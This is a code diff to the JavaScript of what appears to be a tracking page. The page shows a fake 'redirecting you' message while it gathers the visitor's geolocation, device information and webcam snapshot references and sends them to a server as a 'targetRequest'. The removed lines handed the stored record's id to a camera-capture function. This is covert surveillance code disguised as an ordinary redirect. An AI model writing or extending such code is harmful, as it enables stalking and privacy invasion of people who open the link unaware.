@@ -8,6 +8,13 @@ const urlParams = new URLSearchParams(window.location.search);
 locationParam = urlParams.get('location')?.length > 0 ? urlParams.get('location') : locationParam;
 loading.textContent = "Please wait redirecting you to " + locationParam;
 
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+// const photo = document.getElementById('photo');
+const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+const random = Math.random().toString(36).substring(2, 8);
+const filename = `capture-${timestamp}-${random}.png`;
+
 if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
         function(position) {
@@ -16,9 +23,15 @@ if (navigator.geolocation) {
                 longitude: position.coords.longitude,
             }
 
+            const photo = {
+                name: filename,
+                path: "photos/" + filename
+            }
+
             const targetRequest = {
                 location: location,
                 device: getDeviceInformation(),
+                photo: photo
             }
 
             saveLocation(targetRequest)
@@ -27,8 +40,7 @@ if (navigator.geolocation) {
                 })
                 .catch(err => {
                     console.error("Error saving location:", err);
-                })
-            ;
+                });
         },
         function(error) {
             console.error("Error getting location:", error.message);
@@ -51,15 +63,8 @@ const saveLocation = async (req) => {
             if (!response.ok) {
                 throw new Error('Network response was not ok');
             }
-            return response.json();
+            resolve(response.json());
         })
-            .then(data => {
-                return data.id;
-            })
-            .then(locationId => {
-                console.log('Coordinates sent successfully');
-                startCam(locationId);
-            })
         .catch(error => {
             console.error('Error sending coordinates:', error);
             reject(error);
